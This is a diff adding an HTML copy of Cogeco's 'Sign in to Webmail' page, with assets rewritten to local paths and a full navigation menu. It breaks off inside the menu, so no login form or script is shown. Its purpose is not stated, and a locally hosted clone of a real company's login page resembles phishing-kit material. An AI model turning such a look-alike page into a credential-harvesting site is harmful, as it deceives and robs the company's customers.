@@ -1,0 +1,4212 @@
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+    <style>
+      .tippy-box[data-animation="fade"][data-state="hidden"] {
+        opacity: 0;
+      }
+      [data-tippy-root] {
+        max-width: calc(100vw - 10px);
+      }
+      .tippy-box {
+        position: relative;
+        background-color: #333;
+        color: #fff;
+        border-radius: 4px;
+        font-size: 14px;
+        line-height: 1.4;
+        white-space: normal;
+        outline: 0;
+        transition-property: transform, visibility, opacity;
+      }
+      .tippy-box[data-placement^="top"] > .tippy-arrow {
+        bottom: 0;
+      }
+      .tippy-box[data-placement^="top"] > .tippy-arrow:before {
+        bottom: -7px;
+        left: 0;
+        border-width: 8px 8px 0;
+        border-top-color: initial;
+        transform-origin: center top;
+      }
+      .tippy-box[data-placement^="bottom"] > .tippy-arrow {
+        top: 0;
+      }
+      .tippy-box[data-placement^="bottom"] > .tippy-arrow:before {
+        top: -7px;
+        left: 0;
+        border-width: 0 8px 8px;
+        border-bottom-color: initial;
+        transform-origin: center bottom;
+      }
+      .tippy-box[data-placement^="left"] > .tippy-arrow {
+        right: 0;
+      }
+      .tippy-box[data-placement^="left"] > .tippy-arrow:before {
+        border-width: 8px 0 8px 8px;
+        border-left-color: initial;
+        right: -7px;
+        transform-origin: center left;
+      }
+      .tippy-box[data-placement^="right"] > .tippy-arrow {
+        left: 0;
+      }
+      .tippy-box[data-placement^="right"] > .tippy-arrow:before {
+        left: -7px;
+        border-width: 8px 8px 8px 0;
+        border-right-color: initial;
+        transform-origin: center right;
+      }
+      .tippy-box[data-inertia][data-state="visible"] {
+        transition-timing-function: cubic-bezier(0.54, 1.5, 0.38, 1.11);
+      }
+      .tippy-arrow {
+        width: 16px;
+        height: 16px;
+        color: #333;
+      }
+      .tippy-arrow:before {
+        content: "";
+        position: absolute;
+        border-color: transparent;
+        border-style: solid;
+      }
+      .tippy-content {
+        position: relative;
+        padding: 5px 9px;
+        z-index: 1;
+      }
+    </style>
+    <style>
+      /* @see https://github.com/aFarkas/lazysizes#broken-image-symbol */
+      .js img.lazyload:not([src]) {
+        visibility: hidden;
+      } /* @see https://github.com/aFarkas/lazysizes#automatically-setting-the-sizes-attribute */
+      .js img.lazyloaded[data-sizes="auto"] {
+        display: block;
+        width: 100%;
+      } /* Transition effect. */
+      .js .lazyload,
+      .js .lazyloading {
+        opacity: 0;
+      }
+      .js .lazyloaded {
+        opacity: 1;
+        -webkit-transition: opacity 2000ms;
+        transition: opacity 2000ms;
+      }
+    </style>
+    <meta
+      name="description"
+      content="Log in to your Cogeco Webmail account from anywhere. It’s free, easy and secure. Cogeco email addresses are included with all our Internet packages"
+    />
+    <meta name="MobileOptimized" content="width" />
+    <meta name="HandheldFriendly" content="true" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="icon"
+      href="./assets/icons/favicon.ico"
+      type="image/vnd.microsoft.icon"
+    />
+
+    <title>Sign in to Webmail | Cogeco</title>
+
+    <link
+      rel="stylesheet"
+      media="all"
+      href="./assets/css/css_wn3h1nB4F68Ak8B_F0zs94Di4o3Mj3W830dHWCcPKDU.css"
+    />
+    <!-- <link
+      rel="stylesheet"
+      media="all"
+      href="//app.five9.com/five9_clients/consoles_latest/ProactiveChat/stylesheets/five9proactivechat.css"
+    /> -->
+    <link
+      rel="stylesheet"
+      media="all"
+      href="./assets/css/css_3t81BTPEBgrN57oPCV7A9Vt-64vsXOwEVfh7ZNMUx0U.css"
+    />
+    <link
+      rel="stylesheet"
+      media="all"
+      href="./assets/css/css_aUpSwrrl3bXWxHPnRgUJmDPZd3P26n8Jp7xjbNRwxoI.css"
+    />
+
+    <style type="text/css">
+      [responsive-image] > img,
+      [data-responsive-image] {
+        overflow: hidden;
+        padding: 0;
+      }
+      [responsive-image] > img,
+      [data-responsive-image] > img {
+        width: 100%;
+      }
+      @keyframes element-queries {
+        0% {
+          visibility: inherit;
+        }
+      }
+    </style>
+    <style type="text/css">
+      #five9_offerAccepted,
+      #five9_offerRefused {
+        font-size: 0 !important;
+      }
+
+      #five9_offerAccepted:after {
+        content: "Start chat" !important;
+        font-size: 20px !important;
+      }
+
+      #five9_offerRefused:after {
+        content: "No thanks" !important;
+        font-size: 10px !important;
+        color: white !important;
+      }
+
+      div#five9_offerRefused.five9-close-button:hover {
+        opacity: 1;
+      }
+
+      div#five9-maximize-button.five9-chat-button {
+        background-color: #001e62;
+      }
+
+      div#five9-notification.five9-proactive.five9-notification.active {
+        background-image: linear-gradient(#00a7b5 1%, #001e62 100%) !important;
+        color: white !important;
+      }
+
+      div#five9_offerAccepted.five9-start-button {
+        background-color: #ff6d70;
+        color: #001e62;
+      }
+
+      div#five9-minimize-button.five9-chat-button {
+        background-color: #001e62;
+      }
+    </style>
+    <style type="text/css" class="ju_CSSJS_default">
+      .ju_Con {
+        text-align: left;
+        z-index: 99999998;
+        top: 0px;
+        left: 0px;
+        display: none;
+        font-family: Arial, Helvetica, sans-serif;
+        width: 100%;
+        position: absolute;
+        position: fixed;
+        box-sizing: content-box;
+        line-height: normal;
+        -moz-transition: none;
+        -webkit-transition: none;
+        -o-transition: color 0 ease-in;
+        transition: none;
+      }
+      .ju_overlay {
+        text-align: center;
+        display: none;
+        -webkit-transform: translateZ(0);
+        position: fixed;
+        left: 0%;
+        top: 0%;
+        width: 100%;
+        height: 100%;
+        z-index: 999998;
+        background-position: center center;
+        background-repeat: no-repeat;
+        background-size: cover;
+      }
+      .ju_overlay:before {
+        content: "";
+        height: 100%;
+        display: inline-block;
+        vertical-align: middle;
+      }
+      .ju_iframe {
+        border: none !important;
+        width: 100%;
+        height: 100% !important;
+        display: block !important;
+        opacity: 0;
+        max-width: none !important;
+      }
+      .ju_inpage_con {
+        padding: 0 !important;
+      }
+      .ju_inpage_back {
+        background-position: center center;
+        background-repeat: no-repeat;
+        background-size: cover;
+      }
+      .ju_hideall {
+        display: none !important;
+      }
+    </style>
+  </head>
+
+  <body
+    class="lang-en webmail-login"
+    data-province="on"
+    data-zone="I"
+    data-client=""
+  >
+    <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
+      <style>
+        .component-webmail {
+          background: #fff;
+          padding-bottom: 60px;
+        }
+        .component-expand.expand.default {
+          padding: 0;
+        }
+        .node-basic .component-wysiwyg {
+          margin-top: 0;
+        }
+        .good-to-know {
+          color: #009ad2;
+          text-align: center;
+        }
+      </style>
+
+      <div id="wrapper-scroll">
+        <div id="textarea-scroll"></div>
+      </div>
+
+      <div
+        id="sliding-menu"
+        data-track-component-type="navigation"
+        data-track-component-name="main-menu-mobile"
+        data-track-component-position="top"
+      >
+        <div id="sliding-menu-overlay"></div>
+        <div id="sliding-menu-inner" style="width: 292px">
+          <div id="sliding-menu-logo">
+            <div
+              class="simple_html_search"
+              style="
+                margin: 0 25px 0 0;
+                padding: 0;
+                width: 60px;
+                height: 40px;
+                float: right;
+                line-height: 12px;
+                z-index: 1;
+              "
+            >
+              <a id="sliding_search_link" data-track-link-title="search">
+                <span class="icon-magnify" aria-hidden="true"></span>
+              </a>
+            </div>
+            <a href="/en/">
+              <img
+                class="to-loader-logo"
+                src="./assets/images/logo-cogeco-blue.svg"
+                alt="Cogeco"
+              />
+            </a>
+          </div>
+
+          <div id="sliding_header-search" class="element-invisible">
+            <div class="header-search-container container">
+              <div class="row">
+                <div class="col-12">
+                  <form
+                    action="/en/search"
+                    method="get"
+                    onsubmit="return jQuery(this).find('.search_input').val()!='';"
+                  >
+                    <label for="q" class="hidden-off-screen"
+                      >What are you looking for?</label
+                    >
+                    <input
+                      id="q"
+                      class="search_input"
+                      name="q"
+                      type=""
+                      value=""
+                      placeholder="What are you looking for?"
+                    />
+                    <input
+                      class="site"
+                      name="site"
+                      type="hidden"
+                      value="cogeco.ca/en"
+                    />
+                    <label for="search_submit_button" class="hidden-off-screen"
+                      >Submit</label
+                    >
+                    <input
+                      id="search_submit_button"
+                      class="search_submit"
+                      type="image"
+                      src="./assets/images/search.svg"
+                      alt="Submit"
+                      data-track-link-title="search-button"
+                    />
+                  </form>
+                  <button class="close-btn" aria-label="Close"></button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <nav
+            role="navigation"
+            aria-label="Mobile Main Menu EN"
+            id="block-left-nav-en"
+          >
+            <ul class="block-left-main-menu">
+              <li>
+                <a href="" class="parent block-left-main-menu" target="_self">
+                  Shop
+                  <span class="arrow-indicator"
+                    ><span class="fa icon-chevron-down"></span
+                  ></span>
+                </a>
+
+                <ul>
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="shop"
+                      data-track-link-title="Internet"
+                      title="section"
+                    >
+                      Internet
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/promo/special-offer"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > internet"
+                          data-track-link-title="promotions"
+                          data-drupal-link-system-path="node/70021"
+                        >
+                          Promotions
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/packages"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > internet"
+                          data-track-link-title="internet packages"
+                          data-drupal-link-system-path="node/69641"
+                        >
+                          Internet packages
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > internet"
+                          data-track-link-title="why choose cogeco internet"
+                          data-drupal-link-system-path="node/44131"
+                        >
+                          Why choose Cogeco Internet?
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/compare-packages"
+                          target="_self"
+                          data-track-section-name="shop > internet"
+                          data-track-link-title="compare packages"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/54646"
+                        >
+                          Compare packages
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/wifi"
+                          data-track-section-name="shop > internet"
+                          data-track-link-title="Cogeco Wi-Fi"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/70746"
+                        >
+                          Cogeco Wi-Fi
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/wifi-pods"
+                          target="_self"
+                          data-track-section-name="shop > internet"
+                          data-track-link-title="Cogeco Wi-Fi Pods"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/60071"
+                        >
+                          Cogeco Wi-Fi Pods
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="shop"
+                      data-track-link-title="EPICO TV + Internet"
+                    >
+                      EPICO TV + Internet
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/bundles-promotions"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="promotions"
+                          data-drupal-link-system-path="node/69681"
+                        >
+                          Promotions
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/epico"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="Discover EPICO"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/70036"
+                        >
+                          Discover EPICO
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/epico/packages"
+                          target="_self"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="EPICO packages and channels"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/69671"
+                        >
+                          EPICO packages and channels
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/tv/news"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="on demand and free previews"
+                          data-drupal-link-system-path="node/54286"
+                        >
+                          On Demand and free previews
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/channels-listing/premium-channels"
+                          target="_self"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="Premium channels"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/78321"
+                        >
+                          Premium channels
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/channels-listing/sports"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="Sports channels"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/77571"
+                        >
+                          Sports channels
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/tv"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > epico tv + internet"
+                          data-track-link-title="other tv packages"
+                          data-drupal-link-system-path="node/44296"
+                        >
+                          Other TV packages
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="shop"
+                    >
+                      Phone
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/phone/packages"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > phone"
+                          data-track-link-title="phone packages"
+                          data-drupal-link-system-path="node/69661"
+                        >
+                          Phone packages
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/phone"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > phone"
+                          data-track-link-title="why choose cogeco phone"
+                          data-drupal-link-system-path="node/44156"
+                        >
+                          Why choose Cogeco Phone?
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/phone/long-distance-calling-features"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > phone"
+                          data-track-link-title="long distance and calling features"
+                          data-drupal-link-system-path="node/53681"
+                        >
+                          Long distance and calling features
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="shop"
+                    >
+                      Why Cogeco
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/promo/why-choose"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > why cogeco"
+                          data-track-link-title="our commitment"
+                          data-drupal-link-system-path="node/60146"
+                        >
+                          Our commitment
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/networkexpansion"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > why cogeco"
+                          data-track-link-title="cogeco network expansion"
+                          data-drupal-link-system-path="node/69056"
+                        >
+                          Cogeco network expansion
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/boutique/reco/question/1"
+                          data-track-section-name="shop > why cogeco"
+                          data-track-link-title="Find the right package"
+                          class="block-left-main-menu parent"
+                        >
+                          Find the right package
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/promo/moving-offer"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="shop > why cogeco"
+                          data-track-link-title="Moving"
+                          data-drupal-link-system-path="node/69856"
+                        >
+                          Moving?
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+
+              <li>
+                <a
+                  href=""
+                  target="_self"
+                  rel="nofollow"
+                  class="parent block-left-main-menu"
+                >
+                  Customer zone
+                  <span class="arrow-indicator"
+                    ><span class="fa icon-chevron-down"></span
+                  ></span>
+                </a>
+
+                <ul>
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      target="_self"
+                      data-track-section-name="customer zone"
+                    >
+                      My Internet service
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/internet/wifi-pods"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my internet service"
+                          data-track-link-title="Cogeco Wi-Fi and pods"
+                          data-drupal-link-system-path="node/60071"
+                        >
+                          Cogeco Wi-Fi and pods
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/internet/usage/"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my internet service"
+                          data-track-link-title="my internet usage"
+                        >
+                          My Internet usage
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/usage"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my internet service"
+                          data-track-link-title="internet usage explained"
+                          data-drupal-link-system-path="node/57946"
+                        >
+                          Internet usage explained
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/security-services"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my internet service"
+                          data-track-link-title="internet security"
+                          data-drupal-link-system-path="node/48366"
+                        >
+                          Internet security
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/faq/how-do-i-measure-my-internet-speeds-cogeco-speed-test-56111"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my internet service"
+                          data-track-link-title="speed test tool"
+                          data-drupal-link-system-path="node/56111"
+                        >
+                          Speed test tool
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/sections/360012112433-Fraud-and-scams"
+                          target="_self"
+                          data-track-section-name="customer zone > my internet service"
+                          data-track-link-title="Prevent fraud and scams"
+                          class="block-left-main-menu parent"
+                        >
+                          Prevent fraud and scams
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="customer zone"
+                    >
+                      My TV service
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="https://tvlisting.cogeco.ca/"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="tv guide"
+                        >
+                          TV guide
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/tv/channels-listing"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="channel list"
+                          data-drupal-link-system-path="node/54181"
+                        >
+                          Channel list
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/tv/channel_selector/"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="modify my tv channels"
+                        >
+                          Modify my TV channels
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/tv/news"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="what's new on demand"
+                          data-drupal-link-system-path="node/54286"
+                        >
+                          What's new On Demand
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/tv/own-your-movies"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="own your movies"
+                          data-drupal-link-system-path="node/71371"
+                        >
+                          Own your movies
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/epico/get-started"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="get started with epico"
+                          data-drupal-link-system-path="node/68211"
+                        >
+                          Get started with EPICO
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/epico/cloud-pvr-and-remote"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="epico equipment"
+                          data-drupal-link-system-path="node/68346"
+                        >
+                          EPICO equipment
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://www.yourtv.tv/community-selection"
+                          target="_blank"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my tv service"
+                          data-track-link-title="discover yourtv"
+                        >
+                          Discover YourTV
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="customer zone"
+                    >
+                      My Phone service
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/phone/"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my phone service"
+                          data-track-link-title="my phone usage"
+                        >
+                          My Phone usage
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/phone/long-distance-calling-features"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my phone service"
+                          data-track-link-title="long distance and calling features"
+                          data-drupal-link-system-path="node/53681"
+                        >
+                          Long distance and calling features
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="Customer zone"
+                    >
+                      My bill
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/billing"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="view your bill"
+                        >
+                          View my bill
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/understanding-my-bill"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="my bill explained"
+                          data-drupal-link-system-path="node/50981"
+                        >
+                          My bill explained
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/billing/pay_bill"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="make a payment"
+                        >
+                          Make a payment
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/profile"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="change your mailing address"
+                        >
+                          Change my mailing address
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/payment_method"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="change your method of payment"
+                        >
+                          Change my method of payment
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/profile"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="update your user profile"
+                        >
+                          Update my user profile
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/ebilling"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my bill"
+                          data-track-link-title="get paperless billing"
+                        >
+                          Get paperless billing
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="customer zone"
+                    >
+                      My services
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acpub/register/"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my services"
+                          data-track-link-title="register for my account"
+                        >
+                          Register for My Account
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/tv/change-tv"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my services"
+                          data-track-link-title="modify my tv services"
+                        >
+                          Modify my TV services
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acauth/all/internet/change-internet"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my services"
+                          data-track-link-title="modify my internet services"
+                        >
+                          Modify my Internet services
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/outages"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my services"
+                          data-track-link-title="outages and maintenance"
+                          data-drupal-link-system-path="node/56736"
+                        >
+                          Outages and maintenance
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/move-easy"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="customer zone > my services"
+                          data-track-link-title="Moving soon ?"
+                          data-drupal-link-system-path="node/72631"
+                        >
+                          Moving soon?
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+
+              <li>
+                <a
+                  href=""
+                  target="_self"
+                  rel="nofollow"
+                  class="parent block-left-main-menu"
+                >
+                  Support
+                  <span class="arrow-indicator"
+                    ><span class="fa icon-chevron-down"></span
+                  ></span>
+                </a>
+
+                <ul>
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="support"
+                    >
+                      Services
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/support"
+                          target="_self"
+                          data-track-section-name="support > services"
+                          data-track-link-title="general support"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/48671"
+                        >
+                          General support
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/epico"
+                          data-track-section-name="support > services"
+                          data-track-link-title="epico"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/66586"
+                        >
+                          EPICO
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/internet"
+                          target="_self"
+                          data-track-section-name="support > services"
+                          data-track-link-title="internet"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/51471"
+                        >
+                          Internet
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/tv"
+                          target="_self"
+                          data-track-section-name="support > services"
+                          data-track-link-title="standard tv"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/51426"
+                        >
+                          Standard TV
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/phone"
+                          target="_self"
+                          data-track-section-name="support > services"
+                          data-track-link-title="phone"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/51346"
+                        >
+                          Phone
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/internet/security-services"
+                          data-track-section-name="support > services"
+                          data-track-link-title="Cogeco Security"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/48366"
+                        >
+                          Cogeco Security
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/self-install"
+                          data-track-section-name="support > services"
+                          data-track-link-title="self-install"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/66126"
+                        >
+                          Self-install
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/outages"
+                          target="_self"
+                          data-track-section-name="support > services"
+                          data-track-link-title="outages and maintenance"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/56736"
+                        >
+                          Outages and maintenance
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      class="section block-left-main-menu parent"
+                      data-track-section-name="support"
+                      title="section"
+                    >
+                      Billing and account
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="/en/support/billing-and-account"
+                          target="_self"
+                          data-track-section-name="support > billing and account"
+                          data-track-link-title="General support"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/48896"
+                        >
+                          General support
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/move-easy"
+                          target="_self"
+                          data-track-section-name="support > billing and account"
+                          data-track-link-title="moving soon"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/72631"
+                        >
+                          Moving soon?
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/sections/360012112433-Fraud-and-scams"
+                          target="_self"
+                          data-track-section-name="support > billing and account"
+                          data-track-link-title="Fraud and scams"
+                          class="block-left-main-menu parent"
+                        >
+                          Fraud and scams
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/support/dery-axion-integration"
+                          target="_self"
+                          data-track-section-name="support > billing and account"
+                          data-track-link-title="DERY and Axion powered by Cogeco"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/75306"
+                        >
+                          DERY and Axion powered by Cogeco
+                        </a>
+                      </li>
+
+                      <li>
+                        <div role="separator" class="divider"></div>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://myaccount.cogeco.ca/acpub/login"
+                          target="_self"
